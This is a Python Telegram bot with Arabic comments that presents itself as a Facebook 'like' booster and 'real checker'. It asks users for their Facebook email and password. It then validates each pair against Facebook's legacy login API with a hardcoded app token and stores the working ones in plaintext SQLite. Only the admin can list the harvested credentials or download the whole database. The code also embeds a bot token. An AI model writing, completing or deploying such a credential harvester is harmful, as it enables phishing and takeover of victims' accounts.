import sqlite3
import requests
import asyncio
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# 1. إعدادات البوت والمدير
TOKEN = '7991315695:AAECe4ldzt8Qdr-wXaq6IcjZs1zDlFgSOt8'
ADMIN_ID = 7466840742  # ايدي حسابك للتحكم

# --- دالة الفحص الحقيقي (Facebook Real Check) ---
def verify_fb_account(email, password):
    # استخدام بروتوكول رسمي للفحص لضمان أن الحساب شغال 100%
    url = "https://b-api.facebook.com/method/auth.login"
    params = {
        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'email': email,
        'password': password,
        'generate_session_cookies': '1'
    }
    try:
        response = requests.get(url, params=params, timeout=15)
        data = response.json()
        # إذا نجح الدخول (الحساب حقيقي)
        if 'access_token' in data or 'uid' in data:
            return True
        return False
    except:
        return False

# --- تشغيل قاعدة البيانات ---
def init_db():
    conn = sqlite3.connect('verified_fb.db')
    conn.execute('CREATE TABLE IF NOT EXISTS accounts (email TEXT, password TEXT)')
    conn.commit()
    conn.close()

# --- واجهة البوت عند البدء ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    init_db()
    kb = [['➕ Add Account', '🚀 Add Like'], ['📋 My Accounts', '📊 History']]
    if update.message.from_user.id == ADMIN_ID:
        kb.append(['👑 Admin Panel'])
        
    await update.message.reply_text(
        "💎 **MEGA Bot v3 - Real Checker**\nنظام الفحص الحقيقي مفعل. أرسل حساباتك للتأكد منها.",
        reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True)
    )

# --- معالجة الرسائل والمنطق ---
async def handle_logic(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.message.from_user.id
    text = update.message.text
    state = context.user_data.get('state')

    # لوحة الإدارة
    if text == '👑 Admin Panel' and uid == ADMIN_ID:
        conn = sqlite3.connect('verified_fb.db')
        count = conn.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
        conn.close()
        
        btns = [
            [InlineKeyboardButton("📝 عرض الحسابات", callback_data='show')],
            [InlineKeyboardButton("📥 سحب ملف القاعدة", callback_data='db')]
        ]
        await update.message.reply_text(f"📊 الإدارة:\nلديك {count} حساب حقيقي.", reply_markup=InlineKeyboardMarkup(btns))

    elif text == '➕ Add Account':
        context.user_data['state'] = 'MAIL'
        await update.message.reply_text("📧 أرسل الإيميل للحساب الحقيقي:")

    elif state == 'MAIL':
        context.user_data['email'] = text
        context.user_data['state'] = 'PASS'
        await update.message.reply_text("🔑 أرسل كلمة السر:")

    elif state == 'PASS':
        email = context.user_data['email']
        password = text
        msg = await update.message.reply_text("🔍 جاري الفحص في خوادم فيسبوك...")
        
        # الفحص الفعلي
        if verify_fb_account(email, password):
            conn = sqlite3.connect('verified_fb.db')
            conn.execute("INSERT INTO accounts VALUES (?, ?)", (email, password))
            conn.commit()
            conn.close()
            await msg.edit_text("✅ تم بنجاح! الحساب حقيقي وتم حفظه.")
        else:
            await msg.edit_text("❌ فشل التحقق! البيانات خاطئة أو الحساب وهمي.")
        
        context.user_data['state'] = None

# --- معالجة أزرار الإدارة ---
async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID: return
    
    if query.data == 'show':
        conn = sqlite3.connect('verified_fb.db')
        rows = conn.execute("SELECT * FROM accounts").fetchall()
        conn.close()
        res = "📋 قائمة الحسابات:\n\n" + "\n".join([f"📧 `{r[0]}` | 🔑 `{r[1]}`" for r in rows])
        await query.message.reply_text(res if rows else "القاعدة فارغة", parse_mode='Markdown')
        
    elif query.data == 'db':
        await context.bot.send_document(chat_id=ADMIN_ID, document=open('verified_fb.db', 'rb'))

if __name__ == '__main__':
    # إعدادات الحماية من TimedOut
    app = Application.builder().token(TOKEN).connect_timeout(60).read_timeout(60).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(admin_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_logic))
    
    print("🚀 البوت شغال الآن بنظام الفحص الحقيقي..")
    app.run_polling(drop_pending_updates=True)
